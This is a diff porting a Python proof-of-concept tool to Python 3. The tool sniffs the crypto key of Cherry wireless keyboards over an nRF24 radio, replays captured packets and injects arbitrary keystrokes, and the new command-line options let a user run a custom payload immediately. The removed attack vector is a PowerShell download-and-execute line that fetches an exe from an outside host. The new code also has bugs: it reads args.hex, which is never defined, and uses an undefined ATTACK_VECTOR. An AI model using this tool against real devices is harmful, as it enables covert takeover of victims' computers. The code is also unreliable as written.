@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -25,15 +25,27 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+  Einstein2150 (Update 2024):
+  This program has been migrated and further developed for use with
+  Python 3 by Einstein2150. The author acknowledges that ongoing
+  enhancements and updates to the codebase may continue in the future.
+  Users should be aware that the use of this program is at their own
+  risk, and the author accepts no responsibility for any damages that
+  may arise from its use. It is the user's responsibility to ensure 
+  that their use of the program complies with all applicable laws 
+  and regulations.
+
 """
 
-__version__ = '1.0'
-__author__ = 'Matthias Deeg, Gerhard Klostermeier'
+__version__ = '1.1'
+__author__ = 'Einstein2150'
 
+import argparse
 import logging
 import pygame
 
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 from lib import keyboard
 from lib import nrf24
 from logging import debug, info
@@ -42,332 +54,305 @@ from time import sleep, time
 from sys import exit
 
 # constants
-ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile('http://ptmd.sy.gs/syss.exe', '%TEMP%\\syss.exe'); Start-Process '%TEMP%\\syss.exe'"
+DEFAULT_ATTACK_VECTOR   = "Just an input from the hacker :D"
 
-RECORD_BUTTON   = pygame.K_1                # record button
-REPLAY_BUTTON   = pygame.K_2                # replay button
-ATTACK_BUTTON   = pygame.K_3                # attack button
-SCAN_BUTTON     = pygame.K_4                # scan button
+RECORD_BUTTON   = pygame.K_1
+REPLAY_BUTTON   = pygame.K_2
+ATTACK_BUTTON   = pygame.K_3
+SCAN_BUTTON     = pygame.K_4
 
-IDLE            = 0                         # idle state
-RECORD          = 1                         # record state
-REPLAY          = 2                         # replay state
-SCAN            = 3                         # scan state
-ATTACK          = 4                         # attack state
+IDLE            = 0
+RECORD          = 1
+REPLAY          = 2
+SCAN            = 3
+ATTACK          = 4
 
-SCAN_TIME       = 2                         # scan time in seconds for scan mode heuristics
-DWELL_TIME      = 0.1                       # dwell time for scan mode in seconds
-PREFIX_ADDRESS  = ""                        # prefix address for promicious mode
-KEYSTROKE_DELAY = 0.01                      # keystroke delay in seconds
-
+SCAN_TIME       = 2
+DWELL_TIME      = 0.1
+PREFIX_ADDRESS  = ""
+KEYSTROKE_DELAY = 0.01
 
 class CherryAttack():
     """Cherry Attack"""
 
-    def __init__(self):
+    def __init__(self, crypto_key=None, device_address=None, attack_vector=None, execute=False):
         """Initialize Cherry Attack"""
-
-        self.state = IDLE                           # current state
-        self.channel = 6                            # used ShockBurst channel (was 6 for all tested Cherry keyboards)
-        self.payloads = []                          # list of sniffed payloads
-        self.kbd = None                             # keyboard for keystroke injection attacks
-        self.screen = None                          # screen
-        self.font = None                            # font
-        self.statusText = ""                        # current status text
+        info(f"Execute: {execute}, Attack Vector: {attack_vector}")
+        self.crypto_key = crypto_key
+        self.device_address = device_address
+        self.attack_vector = attack_vector
+        self.state = IDLE
+        self.channel = 6
+        self.payloads = []
+        self.kbd = None
+        self.screen = None
+        self.font = None
+        self.statusText = ""
+        self.execute = execute
 
         try:
-            # initialize pygame variables
             pygame.init()
             self.icon = pygame.image.load("./images/syss_logo.png")
             self.bg = pygame.image.load("./images/cherry_attack_bg.png")
-
             pygame.display.set_caption("SySS Cherry Attack PoC")
             pygame.display.set_icon(self.icon)
             self.screen = pygame.display.set_mode((400, 300), 0, 24)
             self.font = pygame.font.SysFont("arial", 24)
-#            self.screen.fill((255, 255, 255))
             self.screen.blit(self.bg, (0, 0))
             pygame.display.update()
+            #pygame.key.set_repeat(250, 50)
 
-            # set key repetition parameters
-            pygame.key.set_repeat(250, 50)
-
-            # initialize radio
             self.radio = nrf24.nrf24()
-
-            # enable LNA
             self.radio.enable_lna()
+            
+            # If key and device address are provided, skip scanning and initialize keyboard directly
+            if self.crypto_key and self.device_address:
+                self.initialize_keyboard()
+            else:
+                self.setState(SCAN)
+            # Check if execute flag is set and attack vector is provided
+            if execute and attack_vector:
+                self.setState(ATTACK)
+                self.perform_attack()  # Perform the attack immediately
+                
+        except Exception as e:
+            info(f"[-] Error: Could not initialize Cherry Attack: {e}")
+            
+    def perform_attack(self):
+        """Perform the attack with the provided attack vector."""
+        if self.kbd is not None:
+            # send keystrokes for attack
+            keystrokes = []
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
+            keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
 
-            # start scanning mode
-            self.setState(SCAN)
-        except:
-            # info output
-            info("[-] Error: Could not initialize Cherry Attack")
+            # send attack keystrokes
+            sleep(0.1)
 
+            keystrokes = self.kbd.getKeystrokes(self.attack_vector)
+            keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
 
-    def showText(self, text, x = 40, y = 140):
+            # send attack keystrokes with a small delay
+            for k in keystrokes:
+                self.radio.transmit_payload(k)
+                info("Sent payload: {0}".format(hexlify(k)))
+
+        self.setState(IDLE)
+
+    def initialize_keyboard(self):
+        """Initialize the keyboard with provided crypto key and device address"""
+        self.kbd = keyboard.CherryKeyboard(bytes(self.crypto_key))
+        info(f"Initialized keyboard with Crypto Key: {hexlify(self.crypto_key).decode('utf-8')} and Device Address: {':'.join(f'{b:02X}' for b in self.device_address)}")
+        info('-------------------------')
+        self.setState(IDLE)     
+            
+    def showText(self, text, x=40, y=140):
         output = self.font.render(text, True, (0, 0, 0))
         self.screen.blit(output, (x, y))
 
-
     def setState(self, newState):
-        """Set state"""
-
         if newState == RECORD:
-            # set RECORD state
             self.state = RECORD
             self.statusText = "RECORDING"
         elif newState == REPLAY:
-            # set REPLAY state
             self.state = REPLAY
             self.statusText = "REPLAYING"
         elif newState == SCAN:
-            # set SCAN state
             self.state = SCAN
             self.statusText = "SCANNING"
         elif newState == ATTACK:
-            # set ATTACK state
             self.state = ATTACK
             self.statusText = "ATTACKING"
         else:
-            # set IDLE state
             self.state = IDLE
             self.statusText = "IDLING"
+            
+       # Call the method to display the menu after switching to IDLE
+        if self.state == IDLE:
+            self.display_menu()
 
+    def display_menu(self):
+        self.showText("-------------------------")
+        info('-------------------------')
+        info('1: RECORDING')
+        info('2: REPLAYING')
+        info('3: ATTACKING')
+        info('4: SCANNING')
+        info('-------------------------')
+        self.showText("1: RECORDING")
+        self.showText("2: REPLAYING")
+        self.showText("3: ATTACKING")
+        self.showText("4: SCANNING")
+        #pygame.display.update()
 
     def unique_everseen(self, seq):
-        """Remove duplicates from a list while preserving the item order"""
         seen = set()
         return [x for x in seq if str(x) not in seen and not seen.add(str(x))]
 
-
     def run(self):
-        # main loop
         while True:
             for i in pygame.event.get():
                 if i.type == QUIT:
                     exit()
-
                 elif i.type == KEYDOWN:
                     if i.key == K_ESCAPE:
                         exit()
-
-                    # record button state transitions
                     if i.key == RECORD_BUTTON:
-                        # if the current state is IDLE change it to RECORD
                         if self.state == IDLE:
-                            # set RECORD state
                             self.setState(RECORD)
-
-                            # empty payloads list
                             self.payloads = []
-
-                        # if the current state is RECORD change it to IDLE
                         elif self.state == RECORD:
-                            # set IDLE state
                             self.setState(IDLE)
-
-                    # play button state transitions
                     if i.key == REPLAY_BUTTON:
-                        # if the current state is IDLE change it to REPLAY
                         if self.state == IDLE:
-                            # set REPLAY state
                             self.setState(REPLAY)
-
-                    # scan button state transitions
                     if i.key == SCAN_BUTTON:
-                        # if the current state is IDLE change it to SCAN
                         if self.state == IDLE:
-                            # set SCAN state
                             self.setState(SCAN)
-
-                    # attack button state transitions
                     if i.key == ATTACK_BUTTON:
-                        # if the current state is IDLE change it to ATTACK
                         if self.state == IDLE:
-                            # set ATTACK state
                             self.setState(ATTACK)
 
-            # show current status on screen
-#            self.screen.fill((255, 255, 255))
             self.screen.blit(self.bg, (0, 0))
             self.showText(self.statusText)
-
-            # update the display
             pygame.display.update()
 
-            # state machine
             if self.state == RECORD:
-                # receive payload
                 value = self.radio.receive_payload()
-
                 if value[0] == 0:
-                    # split the payload from the status byte
                     payload = value[1:]
-
-                    # add payload to list
                     self.payloads.append(payload)
-
-                    # info output, show packet payload
-                    info('Received payload: {0}'.format(hexlify(payload)))
+                    info('Received payload: {0}'.format(hexlify(payload).decode('utf-8')))
 
             elif self.state == REPLAY:
-                # remove duplicate payloads (retransmissions)
                 payloadList = self.unique_everseen(self.payloads)
-
-                # replay all payloads
                 for p in payloadList:
-                    # transmit payload
-                    self.radio.transmit_payload(p.tostring())
-
-                    # info output
-                    info('Sent payload: {0}'.format(hexlify(p)))
-
+                    self.radio.transmit_payload(bytes(p))
+                    info('Sent payload: {0}'.format(hexlify(p).decode('utf-8')))
                     sleep(KEYSTROKE_DELAY)
-
-                # set IDLE state after playback
                 self.setState(IDLE)
 
             elif self.state == SCAN:
-                # put the radio in promiscuous mode
                 self.radio.enter_promiscuous_mode(PREFIX_ADDRESS)
-
-                # define channels for scan mode
                 SCAN_CHANNELS = [6]
-
-                # set initial channel
                 self.radio.set_channel(SCAN_CHANNELS[0])
-
-                # sweep through the defined channels and decode ESB packets in pseudo-promiscuous mode
                 last_tune = time()
                 channel_index = 0
                 while True:
-                    # increment the channel
                     if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
-                        channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
+                        channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
                         self.radio.set_channel(SCAN_CHANNELS[channel_index])
                         last_tune = time()
-
-                    # receive payloads
                     value = self.radio.receive_payload()
                     if len(value) >= 5:
-                        # split the address and payload
-                        address, payload = value[0:5], value[5:]
-
-                        # convert address to string and reverse byte order
-                        converted_address = address[::-1].tostring()
-
-                        # check if the address most probably belongs to a Cherry keyboard
-                        if ord(converted_address[0]) in range(0x31, 0x3f):
-                            # first fit strategy to find a Cherry keyboard
+                        address, payload = value[:5], value[5:]
+                        converted_address = address[::-1]
+                        if converted_address[0] in range(0x31, 0x3f):
                             self.address = converted_address
                             break
-
                 self.showText("Found keyboard")
-                address_string = ':'.join('{:02X}'.format(b) for b in address)
+                address_string = ':'.join(f'{b:02X}' for b in address)
                 self.showText(address_string)
-
-                # info output
-                info("Found keyboard with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
-
-                # put the radio in sniffer mode (ESB w/o auto ACKs)
+                info(f"Found keyboard with address {address_string} on channel {SCAN_CHANNELS[channel_index]}")
                 self.radio.enter_sniffer_mode(self.address)
-
                 info("Searching crypto key")
                 self.statusText = "SEARCHING"
                 self.screen.blit(self.bg, (0, 0))
                 self.showText(self.statusText)
-
-                # update the display
                 pygame.display.update()
-
                 last_key = 0
                 packet_count = 0
                 while True:
-                    # receive payload
                     value = self.radio.receive_payload()
-
                     if value[0] == 0:
-                        # do some time measurement
                         last_key = time()
-
-                        # split the payload from the status byte
                         payload = value[1:]
-
-                        # increment packet count
                         packet_count += 1
-
-                        # show packet payload
-                        info('Received payload: {0}'.format(hexlify(payload)))
-
-                    # heuristic for having a valid release key data packet
+                        info('Received payload: {0}'.format(hexlify(payload).decode('utf-8')))
                     if packet_count >= 4 and time() - last_key > SCAN_TIME:
                         break
-
+                        
                 self.radio.receive_payload()
-
-                self.showText(u"Got crypto key!")
-
-                # info output
-                info('Got crypto key!')
-
-                # initialize keyboard
-                self.kbd = keyboard.CherryKeyboard(payload.tostring())
+                # self.showText("Got crypto key!")
+                self.showText("-------------------------")
+                # Log the Crypto Key and Device Address in hex format
+                crypto_key_hex = hexlify(payload).decode('utf-8')
+                device_address_hex = ':'.join(f'{b:02X}' for b in self.address)
+                info(f'Got crypto key: {crypto_key_hex}')
+                info(f'Device address: {device_address_hex}')
+                
+                self.kbd = keyboard.CherryKeyboard(bytes(payload))
                 info('Initialize keyboard')
-
-                # set IDLE state after scanning
                 self.setState(IDLE)
 
             elif self.state == ATTACK:
-                if self.kbd != None:
-                    # send keystrokes for a classic download and execute PoC attack
-                    keystrokes = []
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
-                    keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+                    if self.kbd != None:
+                        # send keystrokes for attack
+                        keystrokes = []
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_GUI_RIGHT, keyboard.KEY_R))
+                        keystrokes.append(self.kbd.keyCommand(keyboard.MODIFIER_NONE, keyboard.KEY_NONE))
 
-                    # send attack keystrokes
-                    for k in keystrokes:
-                        self.radio.transmit_payload(k)
+                        # send attack keystrokes
+                        sleep(0.1)
 
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
+                        keystrokes = []
+                        keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
+                        keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
 
-                        sleep(KEYSTROKE_DELAY)
+                        # send attack keystrokes with a small delay
+                        for k in keystrokes:
+                            self.radio.transmit_payload(k)
 
-                    # need small delay after WIN + R
-                    sleep(0.2)
+                            # info output
+                            info("Sent payload: {0}".format(hexlify(k)))
+                        
+                    self.setState(IDLE)
 
-                    keystrokes = []
-                    keystrokes = self.kbd.getKeystrokes(ATTACK_VECTOR)
-                    keystrokes += self.kbd.getKeystroke(keyboard.KEY_RETURN)
+            sleep(0.05)
 
-                    # send attack keystrokes with a small delay
-                    for k in keystrokes:
-                        self.radio.transmit_payload(k)
-
-                        # info output
-                        info('Sent payload: {0}'.format(hexlify(k)))
-
-                        sleep(KEYSTROKE_DELAY)
-
-                # set IDLE state after attack
-                self.setState(IDLE)
-
-
-# main program
 if __name__ == '__main__':
-    # setup logging
+    # Setup logging
     level = logging.INFO
     logging.basicConfig(level=level, format='[%(asctime)s.%(msecs)03d]  %(message)s', datefmt="%Y-%m-%d %H:%M:%S")
-
-    # init
-    poc = CherryAttack()
-
-    # run
     info("Start Cherry Attack v{0}".format(__version__))
-    poc.run()
 
-    # done
-    info("Done.")
+    # Set up argument parser
+    parser = argparse.ArgumentParser(description='Cherry Attack PoC - a proof-of-concept tool for demonstrating replay and keystroke injection vulnerabilities of Cherry B.Unlimited AES wireless keyboards.')
+    parser.add_argument('-key', type=str, help='The crypto key')
+    parser.add_argument('-adr', type=str, help='The device address in hex format (e.g. 00:11:22:33:44)')
+    parser.add_argument('-p', '--payload', type=str, help='Custom payload string (can contain special characters)')
+    parser.add_argument('-x', '--execute', action='store_true', help='Execute attack immediately with the provided payload and quit')
 
+    args = parser.parse_args()
+
+    # Validate that both -key and -hex are provided if any
+    if args.key and args.hex:
+        try:
+            crypto_key = unhexlify(args.key.replace(':', ''))
+            device_address = unhexlify(args.hex.replace(':', ''))
+            if len(crypto_key) != 16 or len(device_address) != 5:
+                raise ValueError("Invalid length of crypto key or device address")
+        except Exception as e:
+            info(f"Error: {e}")
+            exit(1)
+    elif args.key or args.hex:
+        info("Both -key and -adr must be provided together")
+        exit(1)
+    else:
+        crypto_key = None
+        device_address = None
+
+    # Set the payload
+    if args.payload:
+        ATTACK_VECTOR = args.payload
+        info(f"Custom payload set: {ATTACK_VECTOR}")
+
+    # Hier ist die Anpassung
+    if args.execute and args.payload:
+        cherry_attack = CherryAttack(crypto_key, device_address, args.payload, execute=True)
+        #cherry_attack.perform_attack()  # Führe den Angriff sofort aus
+    else:
+        cherry_attack = CherryAttack(crypto_key, device_address)
+        cherry_attack.run()
